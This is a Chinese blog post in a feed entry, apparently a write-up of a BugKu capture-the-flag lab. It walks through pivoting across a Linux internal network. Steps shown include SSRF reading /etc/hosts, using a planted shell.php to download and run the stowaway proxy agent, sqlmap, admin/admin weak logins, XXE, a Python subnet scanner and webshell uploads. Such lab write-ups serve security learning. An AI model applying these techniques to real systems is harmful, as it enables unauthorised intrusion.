    <link href="https://ke1nys.github.io/posts/93f2eacf.html"/>
    <id>https://ke1nys.github.io/posts/93f2eacf.html</id>
    <published>2023-11-10T08:38:39.000Z</published>
    <updated>2023-12-06T02:51:48.623Z</updated>
    
    <content type="html"><![CDATA[<p>内网只有linux机器   不是域的</p><p>拿到一个ip  开始fscan和nmap扫一下</p><p><img src="../images/image-20231110164843323.png" alt="image-20231110164843323"></p><p>这里的话一共就是三个端口  这里的这个2376端口没啥用  本来是想着docker -H上的  结果发现不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://47.116.19.50:2376 ps</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231110165410384.png" alt="image-20231110165410384"></p><p><img src="../images/image-20231110165355531.png" alt="image-20231110165355531"></p><p>发现其会访问我们的网站  于是看看能不能打ssrf或者用除了http以外的协议来尝试</p><p><img src="../images/image-20231110165510319.png" alt="image-20231110165510319"></p><p>这样是可以的  接下来尝试ssrf  先使用file协议来读取一下 内网网络地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/hosts</span><br><span class="line"></span><br><span class="line">/etc/network/interfaces  /proc/net/arp  (权限高的情况下读取)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231110165805753.png" alt="image-20231110165805753"></p><p>发现一个<code>192.168.0.2</code>的地址  刚开始我是想着<code>dict://</code>协议去探测内网端口 然后来打ssrf 加xxx服务进入内网的  但是这里发现不行  于是尝试使用http协议来对该地址进行C段的爆破<strong>(其实本质上就是看80端口是否开了服务)</strong></p><p><img src="../images/image-20231110170241638.png" alt="image-20231110170241638"></p><p><img src="../images/image-20231110170555233.png" alt="image-20231110170555233"></p><p>扫出来的地址的话一共是有5个的  并且都是开启了服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.1</span><br><span class="line">192.168.0.2</span><br><span class="line">(快照)</span><br><span class="line"></span><br><span class="line">192.168.0.10  葫芦娃</span><br><span class="line"></span><br><span class="line">192.168.0.138  ID查询</span><br><span class="line"></span><br><span class="line">192.168.0.250  用户登录</span><br></pre></td></tr></table></figure><p>这是着5个端口的作用  先去访问这个葫芦娃地址  因为这个地址题目提示了说是被黑了  并且留有后门</p><p><img src="../images/image-20231110170839212.png" alt="image-20231110170839212"></p><p>直接访问shell.php就行  (猜出来的)</p><p><img src="../images/image-20231110170920455.png" alt="image-20231110170920455"></p><p>能命令执行  直接上stowaway  来设置代理</p><p><img src="../images/image-20231110171044391.png" alt="image-20231110171044391"></p><p>wget下载下来</p><p><img src="../images/image-20231110171120623.png" alt="image-20231110171120623"></p><p>记得加上可执行权限 <strong>(命令要记得URL编码)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod%20%2Bx%20linux_x64_agent</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231110171526998.png" alt="image-20231110171526998"></p><p>上了可执行权限了  然后执行上代理就行了 </p><p><img src="../images/image-20231110171721135.png" alt="image-20231110171721135"></p><p><img src="../images/image-20231110171731300.png" alt="image-20231110171731300"></p><p>然后挂代理  开proxifier就行了</p><p>直接写个马用蚁剑来连这个葫芦娃的网站</p><p><img src="../images/image-20231110172138656.png" alt="image-20231110172138656"></p><p><img src="../images/image-20231110172227570.png" alt="image-20231110172227570"></p><p>根目录和当前目录是各一个flag的</p><p><img src="../images/image-20231110172319251.png" alt="image-20231110172319251"></p><p><img src="../images/image-20231110172532590.png" alt="image-20231110172532590"></p><p>发现其还有一个网卡的 <code>10.10.0.5</code>   但是这里的话fscan是扫不了的  因为icmp协议不能用  说权限不够</p><p>等一会再来看这个 10网卡  先打完192这个网卡</p><p>接下来是打这个 <code>192.168.0.138</code>、</p><p><img src="../images/image-20231110172622487.png" alt="image-20231110172622487"></p><p>感觉sqlmap就能跑了  于是抓包破sqlmap</p><p><img src="../images/image-20231110172742465.png" alt="image-20231110172742465"></p><p>直接跑出  但是这里我在尝试这个<code>--os-shell</code>的时候呢 发现是写不了马的  然后就去打最后一个地址<code>192.168.0.250</code></p><p><img src="../images/image-20231110172856806.png" alt="image-20231110172856806"></p><p>弱口令直接登录  <code>admin/admin</code></p><p><img src="../images/image-20231110172917552.png" alt="image-20231110172917552"></p><p>这里是没有跳转的 所以很奇怪  抓个包看看</p><p><img src="../images/image-20231110173031364.png" alt="image-20231110173031364"></p><p>盲猜打一手xxe</p><p><img src="../images/image-20231110173150156.png" alt="image-20231110173150156"></p><p><img src="../images/image-20231110173211897.png" alt="image-20231110173211897"></p><p>这里就剩我们刚开始看的最后一个那个10网卡的  就去看看他</p><p>因为这里不能fscan来扫内网的c段  然后就想着既然能访问这个10.10.0.5服务 那么蚁剑连他  看看会不会有什么不同</p><p><img src="../images/image-20231110175104100.png" alt="image-20231110175104100"></p><p>写了个脚本来跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    url = f&#x27;http://10.10.0.&#123;i&#125;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        res = requests.get(url=url, timeout=1)</span><br><span class="line">        if res.status_code == 200:</span><br><span class="line">            print(f&#x27;Host &#123;url&#125; is reachable (Status Code: 200)&#x27;)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        # 处理连接超时异常，忽略其他异常</span><br><span class="line">        if isinstance(e, requests.exceptions.ConnectTimeout):</span><br><span class="line">            continue</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的<code>http://10.10.0.1</code>是刚开始的快照</p><p><code>http://10.10.0.5</code> 是葫芦娃</p><p><code>http://10.10.0.22</code> 这个是新的目标</p><p><img src="../images/image-20231110175245780.png" alt="image-20231110175245780"></p><p>目录扫描一下</p><p><img src="../images/image-20231110175501542.png" alt="image-20231110175501542"></p><p>访问后台  还是admin/admin弱口令登录</p><p><img src="../images/image-20231110175605040.png" alt="image-20231110175605040"></p><p><img src="../images/image-20231110175631764.png" alt="image-20231110175631764"></p><p>随意上传个马子上去   然后连蚁剑</p><p><img src="../images/image-20231110175903219.png" alt="image-20231110175903219"></p><p>拿下全部机器  </p><p>渗透结束</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;内网只有linux机器   不是域的&lt;/p&gt;
&lt;p&gt;拿到一个ip  开始fscan和nmap扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231110164843323.png&quot; alt=&quot;image-20231110164843323&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="BugKu" scheme="https://ke1nys.github.io/tags/BugKu/"/>
    
  </entry>
  
</feed>
